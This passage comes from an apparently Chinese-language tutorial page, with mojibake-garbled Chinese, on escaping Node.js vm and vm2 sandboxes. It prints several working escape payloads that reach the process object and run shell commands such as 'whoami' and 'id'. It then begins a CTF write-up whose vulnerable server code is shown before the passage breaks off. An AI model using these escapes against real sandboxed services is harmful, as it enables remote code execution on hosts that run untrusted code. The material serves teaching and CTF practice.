</span></span><span class=line><span class=cl><span class=nx>arguments</span><span class=p>.</span><span class=nx>callee</span><span class=p>.</span><span class=nx>callerè°ƒç”¨å½“å‰å‡½æ•°çš„å¤–å±‚å‡½æ•°</span><span class=err>ï¼Œ</span><span class=nx>å¦‚æœæ˜¯å•å‡½æ•°æ— åµŒå¥—çš„è¯å°±æ˜¯null</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>//ç»•è¿‡ä»£ç 1â€”â€”ä½¿ç”¨arguments.callee.callerå®ç°ç»•è¿‡
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>vm</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;vm&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>res</span> <span class=o>=</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>runInContext</span><span class=p>(</span><span class=sb>`
</span></span></span><span class=line><span class=cl><span class=sb>    function test(){
</span></span></span><span class=line><span class=cl><span class=sb>        const a = {}
</span></span></span><span class=line><span class=cl><span class=sb>        a.toString = function () {
</span></span></span><span class=line><span class=cl><span class=sb>            //è·å–è°ƒç”¨å½“å‰å‡½æ•°çš„å‡½æ•°
</span></span></span><span class=line><span class=cl><span class=sb>            const cc = arguments.callee.caller;
</span></span></span><span class=line><span class=cl><span class=sb>            //åˆ©ç”¨å‡½æ•°çš„constructoræ¥è®¿é—®Functionæ„é€ å‡½æ•°
</span></span></span><span class=line><span class=cl><span class=sb>            //å†æ¬¡åˆ©ç”¨constructoræ¥ç»•è¿‡æ²™ç®±é™åˆ¶è·å–processå¯¹è±¡
</span></span></span><span class=line><span class=cl><span class=sb>            const p = (cc.constructor.constructor(&#39;return process&#39;))();
</span></span></span><span class=line><span class=cl><span class=sb>            return p.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;).toString()
</span></span></span><span class=line><span class=cl><span class=sb>        }
</span></span></span><span class=line><span class=cl><span class=sb>        return a
</span></span></span><span class=line><span class=cl><span class=sb>    }
</span></span></span><span class=line><span class=cl><span class=sb>	test();`</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>vm</span><span class=p>.</span><span class=nx>createContext</span><span class=p>(</span><span class=nb>Object</span><span class=p>.</span><span class=nx>create</span><span class=p>(</span><span class=kc>null</span><span class=p>)));</span>
</span></span><span class=line><span class=cl><span class=c1>// å¼ºåˆ¶å°†resè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå› æ­¤è§¦å‘äº†tostringæ–¹æ³•å³æˆ‘ä»¬ä¸Šé¢è‡ªå®šä¹‰çš„tostringæ–¹æ³•
</span></span></span><span class=line><span class=cl><span class=c1>// ä»è€Œç»•è¿‡æ²™ç®±çš„é™åˆ¶å®ç°äº†RCE
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;&#34;</span> <span class=o>+</span> <span class=nx>res</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>//ç»•è¿‡ä»£ç 2â€”â€”ä½¿ç”¨VMæ²™ç®±Proxyä»£ç†ç»•è¿‡
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>vm</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;vm&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//valueæ˜¯{}å¯¹è±¡ä¼ å…¥çš„ï¼Œè€Œ{}å¯¹è±¡åœ¨å¤–éƒ¨ä½œç”¨åŸŸä¸‹
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>code3</span> <span class=o>=</span> <span class=sb>`new Proxy({}, {
</span></span></span><span class=line><span class=cl><span class=sb>    set: function(me, key, value) {
</span></span></span><span class=line><span class=cl><span class=sb>        (value.constructor.constructor(&#39;return process&#39;))().mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;).toString()
</span></span></span><span class=line><span class=cl><span class=sb>    }
</span></span></span><span class=line><span class=cl><span class=sb>})`</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>//åœ¨ç‰¹å®šçš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œcode3
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>data</span> <span class=o>=</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>runInContext</span><span class=p>(</span><span class=nx>code3</span><span class=p>,</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>createContext</span><span class=p>(</span><span class=nb>Object</span><span class=p>.</span><span class=nx>create</span><span class=p>(</span><span class=kc>null</span><span class=p>)));</span>
</span></span><span class=line><span class=cl><span class=c1>//è®¾ç½®dataå¯¹è±¡çš„ä¸€ä¸ªå±æ€§æ—¶ï¼Œå°±ä¼šè§¦å‘æˆ‘ä»¬ä¹‹å‰å®šä¹‰çš„Proxyå¯¹è±¡çš„&#34;set&#34;æ‹¦æˆªå™¨
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>data</span><span class=p>[</span><span class=s1>&#39;some_key&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=p>{};</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=vm2æ²™ç®±é€ƒé€¸><span>VM2æ²™ç®±é€ƒé€¸</span>
<a href=#vm2%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>vm2åŸºäºvmå¼€å‘ï¼Œä½¿ç”¨å®˜æ–¹çš„vmåº“æ„å»ºæ²™ç®±ç¯å¢ƒã€‚ç„¶åä½¿ç”¨JavaScriptçš„ProxyæŠ€æœ¯æ¥é˜²æ­¢æ²™ç®±è„šæœ¬é€ƒé€¸</p></blockquote><p>VM2ä»£ç åŒ…ä¸­ä¸»è¦ç”¨åˆ°çš„å››ä¸ªæ–‡ä»¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cli.js:å®ç°vm2çš„å‘½ä»¤è¡Œè°ƒç”¨
</span></span><span class=line><span class=cl>contextify.js:å°è£…äº†ä¸‰ä¸ªå¯¹è±¡ï¼Œ Contextify å’Œ Decontextify ï¼Œå¹¶ä¸”é’ˆå¯¹ global çš„Bufferç±»è¿›è¡Œäº†ä»£ç†
</span></span><span class=line><span class=cl>main.js:vm2æ‰§è¡Œçš„å…¥å£ï¼Œå¯¼å‡ºäº† NodeVM, VM è¿™ä¸¤ä¸ªæ²™ç®±ç¯å¢ƒï¼Œè¿˜æœ‰ä¸€ä¸ª VMScript å®é™…ä¸Šæ˜¯å°è£…äº† vm.Script
</span></span><span class=line><span class=cl>sandbox.js:é’ˆå¯¹ global çš„ä¸€äº›å‡½æ•°å’Œå˜é‡è¿›è¡Œäº†hookï¼Œæ¯”å¦‚ setTimeoutï¼ŒsetInterval ç­‰</span></span></code></pre></td></tr></table></div></div><p>ç¤ºä¾‹ä»£ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>//ä»vm2æ¨¡å—å¯¼å…¥äº†ä¸¤ä¸ªä¸»è¦çš„ç±»ï¼šVMå’ŒVMScript
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=p>{</span><span class=nx>VM</span><span class=p>,</span> <span class=nx>VMScript</span><span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;vm2&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//ä½¿ç”¨VMScriptåˆ›å»ºè„šæœ¬å¹¶åœ¨VMä¸­æ‰§è¡Œ
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=k>new</span> <span class=nx>VM</span><span class=p>().</span><span class=nx>run</span><span class=p>(</span><span class=k>new</span> <span class=nx>VMScript</span><span class=p>(</span><span class=s2>&#34;let a = 2;a&#34;</span><span class=p>)));</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>//ç»•è¿‡ä»£ç 
</span></span></span><span class=line><span class=cl><span class=c1>// å¯ç”¨ä¸¥æ ¼æ¨¡å¼
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s2>&#34;use strict&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>// å±è”½åŸå§‹çš„processå¯¹è±¡
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>process</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>// ä¸ºæ‰€æœ‰å¯¹è±¡æ·»åŠ äº†ä¸€ä¸ª has æ–¹æ³•
</span></span></span><span class=line><span class=cl><span class=c1>// å½“è¿™ä¸ªæ–°çš„ has æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œå®ƒä¼šå°è¯•ä½¿ç”¨ä¼ å…¥çš„å¯¹è±¡ t çš„æ„é€ å‡½æ•°æ¥åˆ›å»ºå¹¶è¿”å› process å¯¹è±¡ã€‚
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nb>Object</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>has</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>t</span><span class=p>,</span> <span class=nx>k</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>process</span> <span class=o>=</span> <span class=nx>t</span><span class=p>.</span><span class=nx>constructor</span><span class=p>(</span><span class=s2>&#34;return process&#34;</span><span class=p>)();</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=c1>// è§¦å‘åŸå‹é“¾æ±¡æŸ“
</span></span></span><span class=line><span class=cl><span class=c1>// è¿™é‡Œä½¿ç”¨äº† in è¿ç®—ç¬¦æ¥æ£€æŸ¥ç©ºå­—ç¬¦ä¸² &#34;&#34; æ˜¯å¦ä¸º Buffer.from çš„ä¸€ä¸ªå±æ€§ã€‚
</span></span></span><span class=line><span class=cl><span class=c1>// è¿™ä¸ªæ£€æŸ¥ä¼šè§¦å‘ä¸Šé¢å®šä¹‰çš„ has æ–¹æ³•ï¼ˆå› ä¸º in è¿ç®—ç¬¦åœ¨æŸ¥æ‰¾å±æ€§æ—¶ä¼šè°ƒç”¨å†…éƒ¨çš„[[HasProperty]] æ–¹æ³•ï¼Œè€Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥è¢« has æ–¹æ³•æ‹¦æˆªï¼‰
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s2>&#34;&#34;</span> <span class=k>in</span> <span class=nx>Buffer</span><span class=p>.</span><span class=nx>from</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>process</span><span class=p>.</span><span class=nx>mainModule</span><span class=p>.</span><span class=nx>require</span><span class=p>(</span><span class=s2>&#34;child_process&#34;</span><span class=p>).</span><span class=nx>execSync</span><span class=p>(</span><span class=s2>&#34;whoami&#34;</span><span class=p>).</span><span class=nx>toString</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p>jsçš„ä¸‰ä¸ªå±æ€§ï¼šæ•°æ®å±æ€§ã€è®¿é—®å™¨å±æ€§ã€å†…éƒ¨å±æ€§</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>æ•°æ®å±æ€§å’Œè®¿é—®å™¨å±æ€§éƒ½å­˜åœ¨ [[Enumerable]] å’Œ [[Configurable]] ç‰¹æ€§
</span></span><span class=line><span class=cl>Enumerable ç‰¹æ€§ç”¨äºæ§åˆ¶å±æ€§æ˜¯å¦å¯ä»¥è¢« for...in å¾ªç¯éå†ä»¥åŠæ˜¯å¦å¯ä»¥é€šè¿‡ Object.keys()ã€Object.values()ã€Object.entries() ç­‰æ–¹æ³•è·å–åˆ°
</span></span><span class=line><span class=cl>Configurable ç‰¹æ€§ç”¨äºæ§åˆ¶å±æ€§æ˜¯å¦å¯ä»¥è¢«åˆ é™¤æˆ–ä¿®æ”¹ã€‚</span></span></code></pre></td></tr></table></div></div><p>æ•°æ®å±æ€§</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>æ•°æ®å±æ€§åŒ…å«ä¸€ä¸ªå¯ä»¥è¯»å–å’Œå†™å…¥å±æ€§å€¼çš„å˜é‡ï¼Œå¹¶ä¸”Writableæ§åˆ¶è¿™ä¸ªå€¼æ˜¯å¦å¯æ”¹å˜ï¼Œé»˜è®¤å¯æ”¹å˜</span></span></code></pre></td></tr></table></div></div><p>è®¿é—®å™¨å±æ€§</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>è®¿é—®å™¨å±æ€§ä¸åŒ…å«æ•°æ®å€¼ï¼Œè€Œæ˜¯åŒ…å«ä¸€å¯¹ getter å’Œ setter å‡½æ•°ï¼Œé»˜è®¤ä¸º undefined
</span></span><span class=line><span class=cl>è®¾ç½®å¯¹è±¡çš„è®¿é—®å™¨å±æ€§ï¼Œä¹Ÿå°±ä¸ªgetã€setå±æ€§</span></span></code></pre></td></tr></table></div></div><p>å†…éƒ¨å±æ€§</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>å†…éƒ¨å±æ€§æ˜¯ JavaScript å¼•æ“å†…éƒ¨ä½¿ç”¨çš„å±æ€§ï¼Œä¸èƒ½ç›´æ¥è®¿é—®å®ƒä»¬
</span></span><span class=line><span class=cl>ä¾‹å¦‚ï¼šPrototypeï¼Œæƒ³è¦è®¿é—®Prototypeå¾—ä½¿ç”¨__proto__</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>//ç»•è¿‡ä»£ç 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s2>&#34;use strict&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>//å¯ç”¨ä¸¥æ ¼æ¨¡å¼ï¼Œä»vm2åº“ä¸­å¼•å…¥VMç±»
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=p>{</span><span class=nx>VM</span><span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;vm2&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//å±è”½åŸæœ‰çš„processå¯¹è±¡
</span></span></span><span class=line><span class=cl><span class=c1>// Object.defineProperty() æ˜¯ç”¨äºåœ¨å¯¹è±¡ä¸Šå®šä¹‰ä¸€ä¸ªæ–°å±æ€§ï¼Œæˆ–ä¿®æ”¹å·²æœ‰çš„å±æ€§ã€‚
</span></span></span><span class=line><span class=cl><span class=c1>// è¯­æ³•ï¼šObject.defineProperty(obj, prop, descriptor)
</span></span></span><span class=line><span class=cl><span class=c1>// å…¶ä¸­ï¼Œobj æ˜¯éœ€è¦å®šä¹‰å±æ€§çš„å¯¹è±¡ï¼Œ
</span></span></span><span class=line><span class=cl><span class=c1>//		prop æ˜¯éœ€è¦å®šä¹‰æˆ–ä¿®æ”¹çš„å±æ€§åï¼Œ
</span></span></span><span class=line><span class=cl><span class=c1>//		descriptor æ˜¯ä¸€ä¸ª JavaScript å¯¹è±¡
</span></span></span><span class=line><span class=cl><span class=c1>//åœ¨Buffer.from(&#34;&#34;)å¯¹è±¡ä¸Šå®šä¹‰ä¸€ä¸ªç©ºå­—ç¬¦ä¸²å±æ€§
</span></span></span><span class=line><span class=cl><span class=c1>//åœ¨Object.prototypeä¸Šå®šä¹‰ä¸€ä¸ªåä¸ºgetçš„å±æ€§
</span></span></span><span class=line><span class=cl><span class=c1>//å½“è®¿é—®è¿™ä¸ªgetå±æ€§æ—¶ï¼Œå®ƒä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œå¼‚å¸¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°èƒ½å¤Ÿè¿”å›processå¯¹è±¡
</span></span></span><span class=line><span class=cl><span class=c1>//åœ¨å¼‚å¸¸å¤„ç†ä¸­ï¼Œä»£ç é€šè¿‡e(() =&gt; {})çš„å½¢å¼æ¥è°ƒç”¨è¢«ç¯¡æ”¹çš„Object.prototype.getæ–¹æ³•ï¼Œå°è¯•è·å–åˆ°processå¯¹è±¡ã€‚
</span></span></span><span class=line><span class=cl><span class=c1>//åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œç¯¡æ”¹çš„Object.prototype.getæ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼ŒæŠ›å‡ºä¸€ä¸ªè¿”å›processçš„å‡½æ•°ï¼Œä»è€Œè·å–åˆ°processå¯¹è±¡
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>untrusted</span> <span class=o>=</span> <span class=sb>`var process;
</span></span></span><span class=line><span class=cl><span class=sb>try{
</span></span></span><span class=line><span class=cl><span class=sb>    Object.defineProperty(Buffer.from(&#34;&#34;), &#34;&#34;, {get set(){
</span></span></span><span class=line><span class=cl><span class=sb>        Object.defineProperty(Object.prototype,&#34;get&#34;,{get(){
</span></span></span><span class=line><span class=cl><span class=sb>            throw x=&gt;x.constructor(&#34;return process&#34;)();
</span></span></span><span class=line><span class=cl><span class=sb>        }});
</span></span></span><span class=line><span class=cl><span class=sb>        return ()=&gt;{};
</span></span></span><span class=line><span class=cl><span class=sb>    }});
</span></span></span><span class=line><span class=cl><span class=sb>}catch(e){
</span></span></span><span class=line><span class=cl><span class=sb>    process = e(()=&gt;{});
</span></span></span><span class=line><span class=cl><span class=sb>}
</span></span></span><span class=line><span class=cl><span class=sb>process.mainModule.require(&#34;child_process&#34;).execSync(&#34;id&#34;).toString();`</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=k>new</span> <span class=nx>VM</span><span class=p>().</span><span class=nx>run</span><span class=p>(</span><span class=nx>untrusted</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>catch</span><span class=p>(</span><span class=nx>x</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>x</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=ç¤ºä¾‹é¢˜ç›®><span>ç¤ºä¾‹é¢˜ç›®</span>
<a href=#%e7%a4%ba%e4%be%8b%e9%a2%98%e7%9b%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h4 class=heading-element id=ä¾‹é¢˜-2023hznuctf-eznode><span>ä¾‹é¢˜-2023HZNUCTF eznode</span>
<a href=#%e4%be%8b%e9%a2%98-2023hznuctf-eznode class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>ç”¨å·¥å…·æ‰«æï¼Œæ‰¾åˆ°æºç åœ¨app.pyä¸­ï¼Œä»¥ä¸‹åˆ†æå…³é”®ä»£ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>backdoor</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>//éœ€è¦ä½¿ç”¨åŸå‹é“¾æ±¡æŸ“æ¥æ±¡æŸ“ç©ºå¯¹è±¡çš„shellcodeä»è€Œå®ç°RCE
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>new</span> <span class=nx>VM</span><span class=p>().</span><span class=nx>run</span><span class=p>({}.</span><span class=nx>shellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>e</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>body</span> <span class=o>=</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>copybody</span> <span class=o>=</span> <span class=nx>clone</span><span class=p>(</span><span class=nx>body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1>//copy.bodyçš„shitå±æ€§ä¸ºTrueæ—¶æ‰ä¼šè°ƒç”¨backdoor()
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nx>copybody</span><span class=p>.</span><span class=nx>shit</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>backdoor</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;post shit ok&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>catch</span><span class=p>(</span><span class=nx>e</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;is it shit ?&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
